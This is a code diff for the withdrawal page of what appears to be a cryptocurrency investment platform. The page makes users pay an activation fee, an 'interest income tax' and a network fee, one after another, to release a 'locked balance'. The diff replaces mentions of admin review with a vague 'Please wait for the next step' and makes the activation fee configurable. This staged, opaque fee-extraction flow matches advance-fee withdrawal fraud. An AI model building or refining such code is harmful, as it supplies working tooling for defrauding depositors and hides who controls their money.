@@ -15,15 +15,15 @@ import {
 const statusLabels = {
   pending: 'Pending Withdrawal Request',
   awaiting_activation_fee: 'Awaiting Activation Fee',
-  activation_fee_paid: 'Activation Fee Paid — Awaiting Admin Review',
+  activation_fee_paid: 'Activation Fee Paid — Awaiting Next Step',
   activation_fee_rejected: 'Activation Fee Rejected',
   activation_fee_approved: 'Activation Fee Approved',
   awaiting_interest_tax: 'Awaiting Interest Income Tax',
-  interest_tax_paid: 'Interest Tax Paid — Awaiting Admin Review',
+  interest_tax_paid: 'Interest Tax Paid — Awaiting Next Step',
   interest_tax_rejected: 'Interest Tax Rejected',
   withdrawal_processing: 'Withdrawal Processing',
   awaiting_network_fee: 'Awaiting Network Fee',
-  network_fee_paid: 'Network Fee Paid — Awaiting Admin Review',
+  network_fee_paid: 'Network Fee Paid — Awaiting Next Step',
   withdrawal_successful: 'Withdrawal Successful',
   completed: 'Completed',
   rejected: 'Rejected',
@@ -31,20 +31,20 @@ const statusLabels = {
 };
 
 const statusDescriptions = {
-  pending: 'Your withdrawal request has been received and is ready for activation fee payment.',
-  awaiting_activation_fee: 'Your withdrawal request is waiting for the activation fee. Pay the fee from your available balance to unlock the reserved funds from your locked balance.',
-  activation_fee_paid: 'Your activation fee has been paid. Waiting for admin approval before wallet details become available.',
-  activation_fee_rejected: 'The activation fee payment was rejected. The funds remain locked and you can retry payment once the full activation fee is available.',
-  activation_fee_approved: 'Activation fee approved. Enter your wallet address, cryptocurrency, and withdrawal PIN to continue.',
-  awaiting_interest_tax: 'The system calculated the interest income tax for this withdrawal. Pay the tax to continue.',
-  interest_tax_paid: 'Interest tax payment received. Waiting for admin approval to begin processing.',
-  interest_tax_rejected: 'Interest tax payment was rejected. Complete the remaining payment and resubmit.',
-  withdrawal_processing: 'Your withdrawal is processing for the designated review window. After this period the network fee stage will become available.',
-  awaiting_network_fee: 'A blockchain network fee is required to complete the withdrawal. Pay it from your available balance when prompted.',
-  network_fee_paid: 'Network fee payment received. Waiting for admin verification to finalize the withdrawal.',
+  pending: 'Your withdrawal request has been received. Please wait for the next step.',
+  awaiting_activation_fee: 'Your withdrawal request is waiting for the activation fee step. No activation fee is required for this withdrawal.',
+  activation_fee_paid: 'Your activation fee step has been completed. Please wait for the next step.',
+  activation_fee_rejected: 'The activation fee step was not accepted. Please wait for the next step.',
+  activation_fee_approved: 'Activation fee completed. Enter your wallet address, cryptocurrency, and withdrawal PIN to continue.',
+  awaiting_interest_tax: 'The system calculated the interest income tax for this withdrawal. Please wait for the next step.',
+  interest_tax_paid: 'Interest tax payment received. Please wait for the next step.',
+  interest_tax_rejected: 'The interest tax step was not accepted. Please wait for the next step.',
+  withdrawal_processing: 'Your withdrawal is processing for the designated review window. Please wait for the next step.',
+  awaiting_network_fee: 'A blockchain network fee is required to complete the withdrawal. Please wait for the next step.',
+  network_fee_paid: 'Network fee payment received. Please wait for the next step.',
   withdrawal_successful: 'Your withdrawal has been finalized and sent to your wallet address.',
   completed: 'Withdrawal completed.',
-  rejected: 'Withdrawal rejected by the admin.',
+  rejected: 'Withdrawal rejected.',
   failed: 'Withdrawal failed. Please contact support.',
 };
 
@@ -183,9 +183,11 @@ const Withdraw = () => {
     }
   }, [activeWithdrawal]);
 
-  const remainingActivationFee = activeWithdrawal ? Math.max((activeWithdrawal.activationFeeAmount || 10) - (activeWithdrawal.activationFeePaid || 0), 0) : 0;
+  const configuredActivationFee = activeWithdrawal ? Number(activeWithdrawal.activationFeeAmount ?? 0) : 0;
+  const remainingActivationFee = activeWithdrawal ? Math.max(configuredActivationFee - (activeWithdrawal.activationFeePaid || 0), 0) : 0;
   const remainingInterestTax = activeWithdrawal ? Math.max((activeWithdrawal.interestTaxAmount || 0) - (activeWithdrawal.interestTaxPaid || 0), 0) : 0;
   const remainingNetworkFee = activeWithdrawal ? Math.max((activeWithdrawal.networkFeeAmount || 0) - (activeWithdrawal.networkFeePaid || 0), 0) : 0;
+  const activationFeeRequired = configuredActivationFee > 0;
 
   const handlePayActivationFee = async () => {
     if (!activeWithdrawal) return;
@@ -194,7 +196,7 @@ const Withdraw = () => {
     try {
       const fee = remainingActivationFee;
       if (!fee || fee <= 0) {
-        setActionError('Activation fee is already fully paid. Please wait for admin approval.');
+        setActionError('Activation fee is already fully paid. Please wait for the next step.');
       } else {
         await payActivationFee(activeWithdrawal._id || activeWithdrawal.id, fee);
         await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
@@ -210,7 +212,7 @@ const Withdraw = () => {
   const handleSubmitWithdrawalForm = async () => {
     if (!activeWithdrawal) return;
     if (activeWithdrawal.status !== 'activation_fee_approved') {
-      setActionError('Withdrawal form is only available after admin approval of the activation fee.');
+      setActionError('Withdrawal form is only available after the activation fee step is completed.');
       return;
     }
     if (!validateWalletAddress(walletAddress, selectedNetwork)) {
@@ -246,7 +248,7 @@ const Withdraw = () => {
     try {
       const tax = remainingInterestTax;
       if (!tax || tax <= 0) {
-        setActionError('Interest tax is already fully paid. Please wait for admin approval.');
+        setActionError('Interest tax is already fully paid. Please wait for the next step.');
       } else {
         await payInterestTax(activeWithdrawal._id || activeWithdrawal.id, tax);
         await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
@@ -265,7 +267,7 @@ const Withdraw = () => {
     try {
       const fee = remainingNetworkFee;
       if (!fee || fee <= 0) {
-        setActionError('Network fee is already fully paid. Please wait for admin approval.');
+        setActionError('Network fee is already fully paid. Please wait for the next step.');
       } else {
         await payNetworkFee(activeWithdrawal._id || activeWithdrawal.id, fee);
         await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
@@ -301,7 +303,7 @@ const Withdraw = () => {
     const activationFeeFullyPaid = remainingActivationFee === 0 && ['activation_fee_paid', 'activation_fee_rejected'].includes(status);
     const interestTaxFullyPaid = remainingInterestTax === 0 && ['interest_tax_paid', 'interest_tax_rejected'].includes(status);
     const networkFeeFullyPaid = remainingNetworkFee === 0 && ['network_fee_paid', 'network_fee_rejected'].includes(status);
-    const canPayActivation = ['awaiting_activation_fee', 'activation_fee_rejected', 'activation_fee_paid'].includes(status) && !activationFeeFullyPaid;
+    const canPayActivation = activationFeeRequired && ['awaiting_activation_fee', 'activation_fee_rejected', 'activation_fee_paid'].includes(status) && !activationFeeFullyPaid;
     const canPayTax = ['awaiting_interest_tax', 'interest_tax_rejected', 'interest_tax_paid'].includes(status) && !interestTaxFullyPaid;
     const canPayNetwork = ['awaiting_network_fee', 'network_fee_rejected', 'network_fee_paid'].includes(status) && !networkFeeFullyPaid;
     const showWalletForm = status === 'activation_fee_approved';
@@ -347,7 +349,7 @@ const Withdraw = () => {
               <div className="flex items-center justify-between">
                 <div>
                   <p className="text-gray-400 text-sm">Activation Fee</p>
-                  <p className="text-white font-semibold text-2xl mt-2">${activeWithdrawal.activationFeeAmount ?? 10}</p>
+                  <p className="text-white font-semibold text-2xl mt-2">${configuredActivationFee.toFixed(2)}</p>
                 </div>
                 <div className="text-right text-sm text-gray-400">
                   <p>Verification fee charged from your available balance.</p>
@@ -358,7 +360,7 @@ const Withdraw = () => {
             {activationFeeFullyPaid ? (
               <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 text-gray-300 mb-4">
                 <p className="text-sm">Activation fee fully paid.</p>
-                <p className="text-sm text-gray-400">Waiting for admin review to approve your withdrawal form stage.</p>
+                <p className="text-sm text-gray-400">Please wait for the next step.</p>
               </div>
             ) : (
               <>
@@ -375,6 +377,19 @@ const Withdraw = () => {
                 )}
               </>
             )}
+          </div>
+        )}
+
+        {!canPayActivation && ['awaiting_activation_fee', 'activation_fee_rejected', 'activation_fee_paid'].includes(status) && (
+          <div className="space-y-4 mb-6">
+            <div className="bg-gray-850 p-4 rounded-lg border border-gray-700">
+              <p className="text-gray-400 text-sm">Activation Fee</p>
+              <p className="text-white font-semibold text-2xl mt-2">$0.00</p>
+              <p className="text-gray-500 text-sm mt-2">No activation fee is required for this withdrawal.</p>
+            </div>
+            <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 text-gray-300">
+              <p className="text-sm">Please wait for the next step.</p>
+            </div>
           </div>
         )}
 
@@ -439,7 +454,7 @@ const Withdraw = () => {
         {status === 'activation_fee_paid' && (
           <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 mb-6 text-gray-300">
             <p className="text-sm">Activation fee payment has been received.</p>
-            <p className="text-sm text-gray-400">Please wait for admin approval before wallet address, network, and PIN fields become available.</p>
+            <p className="text-sm text-gray-400">Please wait for the next step.</p>
           </div>
         )}
 
@@ -453,7 +468,7 @@ const Withdraw = () => {
             {interestTaxFullyPaid ? (
               <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 text-gray-300 mb-4">
                 <p className="text-sm">Interest tax fully paid.</p>
-                <p className="text-sm text-gray-400">Waiting for admin review to continue withdrawal processing.</p>
+                <p className="text-sm text-gray-400">Please wait for the next step.</p>
               </div>
             ) : (
               <>
@@ -490,7 +505,7 @@ const Withdraw = () => {
             {networkFeeFullyPaid ? (
               <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 text-gray-300 mb-4">
                 <p className="text-sm">Network fee fully paid.</p>
-                <p className="text-sm text-gray-400">Waiting for admin review to finalize your withdrawal.</p>
+                <p className="text-sm text-gray-400">Please wait for the next step.</p>
               </div>
             ) : (
               <>
